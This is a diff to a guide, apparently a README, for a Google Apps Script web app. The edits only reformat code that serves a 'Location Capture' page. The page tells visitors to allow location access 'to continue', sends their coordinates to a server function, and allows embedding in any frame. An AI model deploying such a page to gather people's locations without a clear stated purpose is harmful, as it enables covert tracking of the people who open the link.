@@ -15,7 +15,7 @@
 ### Code.gs:
 
 -----
-
+```code.gs
 function doGet() {
   return HtmlService.createHtmlOutputFromFile('Index')
     .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL);}
@@ -69,26 +69,25 @@ function onFormSubmit(e) {
 
   } 
   
-  catch (err)  
-  {
+  catch (err) {
     Logger.log('onFormSubmit error: ' + err);
     throw err; // so you can see it in Executions
   }
 }
-
+ ```
 -----
 
-**Make a index.html file then copy this code in it.**
-### index.html code:
-----
+**Make a index.html file in the apps script then copy the below code in it.**
+## index.html code:
 
+```html
 <!DOCTYPE html>
 <html>
-<head><title>Location Capture</title></head>
+<head>
+  <title>Location Capture</title>
+</head>
 <body>
-  
   <h3>Allow location access to continue...</h3>
-  
   <script>
     navigator.geolocation.getCurrentPosition(function(position)  {
       var data = {lat: position.coords.latitude, lng: position.coords.longitude};
@@ -97,8 +96,6 @@ function onFormSubmit(e) {
       }).processLocation(data);
     }, function() { alert('Location denied.'); window.close(); });
   </script>
-  
 </body>
 </html>
 
------
